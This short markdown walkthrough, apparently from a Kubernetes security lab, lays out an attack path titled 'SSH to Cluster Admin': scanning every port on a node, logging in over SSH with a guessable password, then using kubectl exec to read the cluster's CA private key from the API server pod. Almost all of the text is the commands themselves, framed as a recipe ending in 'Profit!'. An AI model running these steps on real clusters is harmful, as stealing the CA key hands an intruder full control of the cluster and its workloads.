# SSH to Cluster Admin

### Compromising the cluster

1. Scan all ports on node `nmap [CLUSTERIP] -p-`
2. Login via ssh `ssh -p 32001 sshuser@[CLUSTER IP]`. When prompted for a password, type `sshuser`
4. Get list of pods in kube-system namespace `kubectl get po -n kube-system` 
5. Grab the certificate `kubectl -n kube-system exec [API_SERVER_POD] -- cat /etc/kubernetes/pki/ca.key`
6. Profit!
